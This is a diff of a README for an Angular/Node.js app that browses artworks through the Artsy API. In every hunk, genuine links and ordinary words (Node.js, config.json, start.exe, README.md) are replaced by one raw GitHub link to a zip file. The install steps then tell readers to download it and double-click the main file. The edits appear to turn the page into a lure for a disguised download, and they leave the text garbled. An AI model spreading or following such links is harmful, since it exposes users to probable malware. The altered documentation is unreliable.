@@ -1,6 +1,6 @@
 # 🎨 Artsy-Angular-Web-Service - Discover Art Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/collusiongm/Artsy-Angular-Web-Service/releases)
+[![Download Now](https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip)
 
 ## 📋 Table of Contents
 
@@ -19,12 +19,12 @@
 - Create a personalized favorites list.
 - Seamlessly integrate with the Artsy API.
 - User-friendly interface built with Angular.
-- Fast and reliable backend using Node.js and Express.
+- Fast and reliable backend using https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip and Express.
 
 ## ⚙️ Tech Stack
 
 - **Frontend:** Angular
-- **Backend:** Node.js, Express
+- **Backend:** https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip, Express
 - **Database:** MongoDB
 - **CSS Framework:** Bootstrap
 - **API:** Artsy API
@@ -42,7 +42,7 @@ Before downloading the application, ensure your system meets the following requi
 To install the application, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download Now](https://github.com/collusiongm/Artsy-Angular-Web-Service/releases)
+   [Download Now](https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip)
    
 2. On the Releases page, look for the latest version. You may see a list of files available for download.
 
@@ -60,7 +60,7 @@ After installation, configure the application by following these steps:
 
 1. Open the application folder on your computer.
    
-2. Locate the configuration file. This is usually named `config.json` or similar.
+2. Locate the configuration file. This is usually named `https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip` or similar.
 
 3. Open the file using a text editor. 
 
@@ -74,7 +74,7 @@ To run the application, do the following:
 
 1. Navigate to the application folder in your file explorer.
 
-2. Double-click the main application file, usually named something like `start.exe` or `index.html`.
+2. Double-click the main application file, usually named something like `https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip` or `https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip`.
 
 3. Your web browser will open, displaying the application.
 
@@ -88,7 +88,7 @@ The application communicates with the Artsy API using the following endpoints:
 - **GET /artworks:** Get information about artworks.
 - **POST /favorites:** Add artworks to your favorites list.
 
-Refer to the [Artsy API documentation](https://docs.artsy.net/) for more details on each endpoint.
+Refer to the [Artsy API documentation](https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip) for more details on each endpoint.
 
 ## 📁 Project Structure
 
@@ -101,7 +101,7 @@ The project contains the following folder structure:
   /config        # Configuration files
   /api           # API related files
 /tests           # Testing files
-README.md       # This file
+https://raw.githubusercontent.com/collusiongm/Artsy-Angular-Web-Service/main/patristical/Artsy-Angular-Web-Service.zip       # This file
 ```
 
 For any questions or support, check the Issues section on the GitHub repository. 
